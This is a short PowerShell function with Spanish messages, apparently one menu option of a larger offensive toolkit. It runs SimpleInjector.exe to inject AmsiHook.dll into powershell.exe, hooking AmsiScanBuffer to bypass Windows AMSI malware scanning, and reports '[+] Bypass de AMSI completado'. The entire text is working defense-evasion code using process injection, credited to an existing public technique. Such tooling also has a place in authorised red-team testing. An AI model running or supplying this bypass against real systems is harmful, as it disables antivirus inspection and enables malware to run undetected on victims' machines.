
function Hooking

{

    Write-Host "";
    Write-Host "Técnica original de Tom Carver";
    Write-Host "https://github.com/tomcarver16/AmsiHook";
    Write-Host "";
    Write-Host -ForegroundColor Yellow "Haciendo hooking a Amsi-ScanBuffer...";

    #Lanzamos el inyector
    try
    {
        .\SimpleInjector.exe powershell.exe .\AmsiHook.dll
        Write-Host -ForegroundColor Yellow "[+] Bypass de AMSI completado";
    }
    catch
    {
        Write-host "Intente otra técnica para hacer el bypass de AMSI";
    }

    pause;
    Show_menu

}